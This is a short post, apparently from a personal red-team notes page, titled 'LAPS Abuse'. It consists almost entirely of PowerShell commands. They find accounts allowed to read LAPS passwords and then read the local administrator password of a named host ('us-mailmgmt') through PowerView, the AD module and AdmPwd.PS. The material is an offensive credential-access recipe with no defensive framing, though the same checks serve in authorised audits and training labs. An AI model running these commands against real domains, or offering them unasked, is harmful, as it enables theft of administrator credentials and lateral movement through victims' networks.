---
layout: post
date: 23/11/2022
author: Aswin Gopalakrishnan
title: LAPS Abuse
---

## PowerView

### Find Users Who Can Read Passwords in Clear Text
```bash
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    ($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and
    ($_.ActiveDirectoryRights -match 'ReadProperty')
} | ForEach-Object {
    $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_
}
```

## AD Module

1. Import All Module
```bash
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
```
2. Get Permissions
```
C:\AD\Tools\Get-LapsPermissions.ps1
```
3. View Password
```bash
Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
Get-AdmPwdPassword -ComputerName us-mailmgmt
```
The `Get-AdmPwdPassword` command uses the LAPS module.